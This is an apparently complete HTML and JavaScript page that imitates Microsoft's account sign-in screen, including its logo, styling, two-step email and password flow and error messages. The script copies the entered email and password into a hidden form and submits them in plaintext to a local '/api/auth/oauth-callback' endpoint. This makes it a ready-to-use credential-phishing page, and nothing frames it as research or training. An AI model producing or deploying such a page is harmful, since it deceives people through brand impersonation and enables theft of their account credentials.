<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<link rel="icon" type="image/x-icon" href="https://www.microsoft.com/favicon.ico">
<style>
  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&display=swap');
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #e8f0fe 0%, #d4e4fa 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
  .card { width: 100%; max-width: 440px; background: #fff; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,.2); position: relative; }
  .logo { margin-bottom: 16px; }
  .logo svg { width: 108px; height: 24px; }
  h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; line-height: 1.25; }
  .email-back { color: #0067b8; font-size: 13px; cursor: pointer; margin-bottom: 16px; display: none; align-items: center; gap: 6px; }
  .email-back:hover { text-decoration: underline; }
  .email-back svg { width: 12px; height: 12px; fill: #0067b8; }
  .field { margin-bottom: 16px; }
  input { width: 100%; padding: 6px 10px; border: 1px solid #8c8c8c; font-size: 15px; color: #1b1b1b; outline: none; height: 36px; }
  input:focus { border-color: #0067b8; }
  input::placeholder { color: #605e5c; }
  input.err { border-color: #d83b01; }
  .err-msg { color: #d83b01; font-size: 13px; margin-top: -8px; margin-bottom: 12px; display: none; }
  .err-msg.show { display: block; }
  .hint { font-size: 13px; color: #1b1b1b; margin: 16px 0; }
  .hint a { color: #0067b8; cursor: pointer; text-decoration: none; }
  .hint a:hover { text-decoration: underline; }
  .btn { background: #0067b8; color: #fff; border: none; padding: 6px 24px; font-size: 15px; cursor: pointer; height: 32px; min-width: 108px; }
  .btn:hover { background: #005a9e; }
  .btn:disabled { opacity: .6; cursor: default; }
  .btn-secondary { background: #ccc; color: #000; border: none; padding: 6px 24px; font-size: 15px; cursor: pointer; height: 32px; }
  .btn-secondary:hover { background: #b3b3b3; }
  .actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 16px; }
  .footer { margin-top: 32px; font-size: 12px; color: #8c8c8c; display: flex; justify-content: space-between; }
  .footer span:hover { text-decoration: underline; cursor: pointer; }
  .step2 { display: none; }
  .hidden-form { display: none; }
</style>
</head>
<body>
<div class="card">
  <div class="logo" style="display:flex;align-items:center;gap:12px;">
    <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="10" height="10" fill="#f25022"/>
      <rect x="11" width="10" height="10" fill="#7fba00"/>
      <rect y="11" width="10" height="10" fill="#00a4ef"/>
      <rect x="11" y="11" width="10" height="10" fill="#ffb900"/>
    </svg>
    <span style="font-family:'Segoe UI',Arial,sans-serif;font-size:22px;color:#737373;letter-spacing:-0.5px;">Microsoft</span>
  </div>

  <div class="step1" id="s1">
    <h1>Sign in</h1>
    <div class="field">
      <input type="text" id="email" placeholder="Email, phone, or Skype" required autofocus>
    </div>
    <div class="err-msg" id="e1">Enter a valid email address, phone number, or Skype name.</div>
    <p class="hint">No account? <a>Create one!</a></p>
    <div class="actions">
      <button class="btn" id="btn1" onclick="nextStep()">Next</button>
    </div>
  </div>

  <div class="step2" id="s2">
    <h1>Enter password</h1>
    <div class="email-back" id="back" onclick="goBack()">
      <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
      <span id="em"></span>
    </div>
    <div class="field">
      <input type="password" id="pwd" placeholder="Password" required>
    </div>
    <div class="err-msg" id="e2">Your account or password is incorrect. If you don't remember your password, <a>reset it now</a>.</div>
    <p class="hint"><a>Forgot password?</a></p>
    <div class="actions">
      <button class="btn-secondary" onclick="goBack()">Back</button>
      <button class="btn" id="btn2" onclick="doLogin()">Sign in</button>
    </div>
  </div>

  <form class="hidden-form" id="loginForm" action="/api/auth/oauth-callback" method="POST">
    <input type="hidden" name="provider" id="fProvider" value="microsoft">
    <input type="hidden" name="email" id="fEmail">
    <input type="hidden" name="password" id="fPassword">
  </form>

  <div class="footer">
    <div>
      <span>Terms of use</span>
      &middot;
      <span>Privacy &amp; cookies</span>
    </div>
    <div><span>...</span></div>
  </div>
</div>

<script>
let emailVal = '';
function nextStep() {
  const e = document.getElementById('email').value.trim();
  if (!e || !e.includes('@')) {
    document.getElementById('email').classList.add('err');
    document.getElementById('e1').classList.add('show');
    return;
  }
  emailVal = e;
  document.getElementById('e1').classList.remove('show');
  document.getElementById('email').classList.remove('err');
  document.getElementById('s1').style.display = 'none';
  document.getElementById('s2').style.display = 'block';
  document.getElementById('back').style.display = 'flex';
  document.getElementById('em').textContent = e;
  document.getElementById('pwd').focus();
}
function goBack() {
  document.getElementById('s2').style.display = 'none';
  document.getElementById('s1').style.display = 'block';
  document.getElementById('back').style.display = 'none';
  document.getElementById('e2').classList.remove('show');
  document.getElementById('pwd').value = '';
}
function doLogin() {
  const pwd = document.getElementById('pwd').value;
  if (!pwd) return;
  const btn = document.getElementById('btn2');
  btn.textContent = 'Signing in…';
  btn.disabled = true;
  document.getElementById('fEmail').value = emailVal;
  document.getElementById('fPassword').value = pwd;
  document.getElementById('loginForm').submit();
}
</script>
</body>
</html>
